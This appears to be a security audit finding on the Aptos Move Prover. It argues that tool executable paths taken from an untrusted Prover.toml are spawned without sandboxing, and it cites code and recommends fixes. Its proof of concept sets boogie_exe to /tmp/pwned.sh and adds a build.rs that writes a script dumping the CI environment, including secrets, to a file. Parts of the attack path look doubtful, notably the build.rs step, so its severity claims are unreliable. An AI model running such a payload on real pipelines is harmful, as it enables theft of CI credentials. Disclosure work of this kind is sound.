# Audit Report

## Title
Arbitrary Code Execution via Unsandboxed Subprocess Spawning in Move Prover

## Summary
The Move Prover spawns external verification tools (Boogie, Z3, CVC5) as subprocesses without any sandboxing mechanisms. Executable paths can be controlled through `Prover.toml` configuration files in Move packages, enabling arbitrary code execution when the prover runs on untrusted packages in CI/CD pipelines or automated verification systems.

## Finding Description

The Move CLI's `prove` command spawns verification tool subprocesses without isolation or privilege restrictions. The vulnerability exists in three key components:

**1. Configuration Loading Without Validation**

The prover loads `Prover.toml` from untrusted package directories and uses executable paths from this configuration without validation: [1](#0-0) 

**2. Preservation of Malicious Paths**

When converting options, the code explicitly overrides certain fields but preserves critical executable paths from the untrusted configuration using struct update syntax: [2](#0-1) 

Notably, `boogie_flags` is cleared (line 247) and `custom_natives` is set to None (line 264), but `boogie_exe`, `z3_exe`, and `cvc5_exe` are preserved from the base configuration via the `..base_opts.backend` spread operator at line 268.

**3. Unsandboxed Subprocess Execution**

The prover task runner spawns subprocesses using `tokio::process::Command` without any sandboxing: [3](#0-2) 

No seccomp filters, chroot, namespace isolation, or container sandboxing is applied. The spawned process inherits full privileges of the parent.

**Attack Path:**

1. Attacker creates a malicious Move package containing `Prover.toml`:
```toml
[backend]
boogie_exe = "/tmp/malicious_payload"
```

2. Attacker includes a `build.rs` or setup script that creates the malicious executable at the specified path

3. When CI runs automated prover tests [4](#0-3) , the malicious package is processed

4. The test flow calls [5](#0-4)  which invokes the prover

5. The prover loads the malicious `Prover.toml` and spawns the attacker-controlled executable with CI privileges

6. The malicious process can exfiltrate secrets, modify the repository, or compromise build artifacts

## Impact Explanation

This vulnerability enables **arbitrary code execution in CI/CD pipelines** and any automated verification system that processes untrusted Move packages. While this is a development tooling issue rather than a blockchain runtime vulnerability, the impact includes:

- **Supply Chain Compromise**: Attackers can inject malicious code into Aptos releases by compromising the CI pipeline
- **Credential Theft**: CI environments contain signing keys, GitHub tokens, and cloud credentials
- **Repository Tampering**: Attackers can modify source code or merge malicious changes

According to the Aptos bug bounty categories, this would fall under **High Severity** as it represents a "Significant protocol violation" in the development and release process, though it does not directly affect running validator nodes.

## Likelihood Explanation

**Likelihood: Medium-High**

The attack requires:
- Submitting a PR with a malicious Move package (low barrier)
- Including a `Prover.toml` and build script (straightforward)
- Waiting for CI to run automated prover tests (happens automatically)

No special privileges or insider access is required. The attack is feasible for any external contributor who can submit a PR. The Aptos CI automatically runs prover tests on framework packages [6](#0-5) , making this a realistic attack vector.

## Recommendation

Implement defense-in-depth sandboxing for subprocess execution:

**1. Path Validation:**
```rust
fn validate_executable_path(path: &str) -> anyhow::Result<()> {
    let path = PathBuf::from(path);
    // Only allow executables from trusted directories
    let allowed_dirs = ["/usr/bin", "/usr/local/bin", "/home/runner/bin"];
    let canonical = path.canonicalize()?;
    
    if !allowed_dirs.iter().any(|dir| canonical.starts_with(dir)) {
        bail!("Executable path not in allowed directory: {}", path.display());
    }
    
    // Prevent symlink attacks
    if canonical != path {
        bail!("Symlinks not allowed in executable paths");
    }
    
    Ok(())
}
```

**2. Sandboxed Execution (Linux):**
```rust
use std::os::unix::process::CommandExt;

Command::new(&args[0])
    .args(&args[1..])
    .pre_exec(|| {
        // Drop capabilities, restrict syscalls via seccomp
        restrict_capabilities()?;
        apply_seccomp_filter()?;
        Ok(())
    })
    .kill_on_drop(true)
    .output()
    .await
```

**3. Configuration Hardening:**

Prevent loading of executable paths from untrusted `Prover.toml`:
```rust
// In convert_options(), always use environment variables for executables
backend: BoogieOptions {
    // Force use of environment-provided executables
    boogie_exe: std::env::var("BOOGIE_EXE").unwrap_or_default(),
    z3_exe: std::env::var("Z3_EXE").unwrap_or_default(),
    cvc5_exe: std::env::var("CVC5_EXE").unwrap_or_default(),
    // ... other safe fields from base_opts
}
```

**4. CI Isolation:**

Run prover tests in isolated containers with restricted network access and no access to secrets.

## Proof of Concept

**Step 1:** Create a malicious Move package with `Prover.toml`:
```toml
[backend]
boogie_exe = "/tmp/pwned.sh"
```

**Step 2:** Add `build.rs` to the package:
```rust
fn main() {
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    
    let script = r#"#!/bin/bash
echo "PWNED: $(whoami)" > /tmp/proof_of_compromise.txt
env > /tmp/env_dump.txt
"#;
    
    fs::write("/tmp/pwned.sh", script).unwrap();
    let mut perms = fs::metadata("/tmp/pwned.sh").unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions("/tmp/pwned.sh", perms).unwrap();
}
```

**Step 3:** Add a prover test that will trigger the vulnerability:
```rust
#[test]
#[ignore] // Run with --include-ignored prover
fn test_prover_exploit() {
    use aptos_framework::prover::ProverOptions;
    let opts = ProverOptions::default_for_test();
    opts.prove(
        false,
        Path::new("."),
        BTreeMap::default(),
        None, None, None,
        false, &BTreeSet::default(), &[]
    ).unwrap();
}
```

**Expected Result:** When CI runs `cargo test -- --include-ignored prover`, the script executes, creating `/tmp/proof_of_compromise.txt` with CI privileges, demonstrating arbitrary code execution.

**Notes**

This vulnerability demonstrates a critical gap in subprocess sandboxing that affects Move Prover's security posture when processing untrusted packages. While the Move Prover is development tooling rather than blockchain runtime, its use in automated CI/CD pipelines creates a supply chain attack vector that could compromise the entire Aptos development and release process.

The fix requires both immediate hardening (path validation, configuration restrictions) and longer-term architectural improvements (proper sandboxing with seccomp/namespaces or containerization).

### Citations

**File:** aptos-move/framework/src/prover.rs (L207-212)
```rust
        let prover_toml = package_path.join("Prover.toml");
        let base_opts = if prover_toml.exists() {
            Options::create_from_toml_file(prover_toml.to_string_lossy().as_ref())?
        } else {
            Options::default()
        };
```

**File:** aptos-move/framework/src/prover.rs (L245-269)
```rust
            backend: move_prover_boogie_backend::options::BoogieOptions {
                use_cvc5: self.cvc5 || base_opts.backend.use_cvc5,
                boogie_flags: vec![],
                generate_smt: self.dump || base_opts.backend.generate_smt,
                stratification_depth: self
                    .stratification_depth
                    .unwrap_or(base_opts.backend.stratification_depth),
                proc_cores: self.proc_cores.unwrap_or(base_opts.backend.proc_cores),
                shards: self.shards.unwrap_or(base_opts.backend.shards),
                only_shard: self.only_shard.or(base_opts.backend.only_shard),
                vc_timeout: self.vc_timeout.unwrap_or(base_opts.backend.vc_timeout),
                global_timeout_overwrite: !self.disallow_global_timeout_to_be_overwritten,
                keep_artifacts: self.dump || base_opts.backend.keep_artifacts,
                stable_test_output: self.stable_test_output || base_opts.backend.stable_test_output,
                z3_trace_file: if self.dump {
                    Some("z3.trace".to_string())
                } else {
                    None
                },
                custom_natives: None,
                loop_unroll: self.loop_unroll.or(base_opts.backend.loop_unroll),
                skip_instance_check: self.skip_instance_check
                    || base_opts.backend.skip_instance_check,
                ..base_opts.backend
            },
```

**File:** third_party/move/move-prover/boogie-backend/src/prover_task_runner.rs (L187-198)
```rust
    async fn run(&mut self, task_id: Self::TaskId, sem: Arc<Semaphore>) -> Self::TaskResult {
        let _guard = sem.acquire().await;
        let args = self
            .get_boogie_command(task_id)
            .map_err(std::io::Error::other)?;
        debug!("running Boogie command with seed {}", task_id);
        Command::new(&args[0])
            .args(&args[1..])
            .kill_on_drop(true)
            .output()
            .await
    }
```

**File:** .github/workflows/prover-daily-test.yaml (L22-33)
```yaml
  prover-inconsistency-test:
    runs-on: runs-on,cpu=64,family=c7,disk=large,image=aptos-ubuntu-x64,run-id=${{ github.run_id }}
    timeout-minutes: ${{ github.event_name == 'pull_request' && 10 || 480}}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0 # get all the history because cargo xtest --change-since origin/main requires it.
      - uses: ./.github/actions/move-prover-setup
      - run: MVP_TEST_DISALLOW_TIMEOUT_OVERWRITE=1 MVP_TEST_VC_TIMEOUT=1200 cargo test -p aptos-move-examples --release -- --include-ignored prover
      - run: MVP_TEST_DISALLOW_TIMEOUT_OVERWRITE=1 MVP_TEST_VC_TIMEOUT=7200 cargo test -p aptos-framework --release -- --include-ignored prover
      - run: MVP_TEST_DISALLOW_TIMEOUT_OVERWRITE=1 MVP_TEST_VC_TIMEOUT=1200 MVP_TEST_INCONSISTENCY=1 cargo test -p aptos-move-examples --release -- --include-ignored prover
      - run: MVP_TEST_DISALLOW_TIMEOUT_OVERWRITE=1 MVP_TEST_VC_TIMEOUT=7200 MVP_TEST_INCONSISTENCY=1 cargo test -p aptos-framework --release -- --include-ignored prover
```

**File:** aptos-move/framework/tests/move_prover_tests.rs (L32-78)
```rust
pub fn run_prover_for_pkg(
    path_to_pkg: impl Into<String>,
    shards: usize,
    only_shard: Option<usize>,
) {
    let pkg_path = path_in_crate(path_to_pkg);
    let mut options = ProverOptions::default_for_test();
    let no_tools = read_env_var("BOOGIE_EXE").is_empty()
        || !options.cvc5 && read_env_var("Z3_EXE").is_empty()
        || options.cvc5 && read_env_var("CVC5_EXE").is_empty();
    if no_tools {
        panic!(
            "Prover tools are not configured, \
        See https://github.com/aptos-labs/aptos-core/blob/main/aptos-move/framework/FRAMEWORK-PROVER-GUIDE.md \
        for instructions, or \
        use \"-- --skip prover\" to filter out the prover tests"
        );
    } else {
        let inconsistency_flag = read_env_var(ENV_TEST_INCONSISTENCY) == "1";
        let unconditional_abort_inconsistency_flag =
            read_env_var(ENV_TEST_UNCONDITIONAL_ABORT_AS_INCONSISTENCY) == "1";
        let disallow_timeout_overwrite = read_env_var(ENV_TEST_DISALLOW_TIMEOUT_OVERWRITE) == "1";
        options.shards = Some(shards);
        options.only_shard = only_shard;
        options.check_inconsistency = inconsistency_flag;
        options.unconditional_abort_as_inconsistency = unconditional_abort_inconsistency_flag;
        options.disallow_global_timeout_to_be_overwritten = disallow_timeout_overwrite;
        options.vc_timeout = read_env_var(ENV_TEST_VC_TIMEOUT)
            .parse::<usize>()
            .ok()
            .or(options.vc_timeout);
        let skip_attribute_checks = false;
        options
            .prove(
                false,
                pkg_path.as_path(),
                BTreeMap::default(),
                Some(VERSION_DEFAULT),
                Some(CompilerVersion::latest_stable()),
                Some(LanguageVersion::latest_stable()),
                skip_attribute_checks,
                extended_checks::get_all_attribute_names(),
                &[],
            )
            .unwrap()
    }
}
```
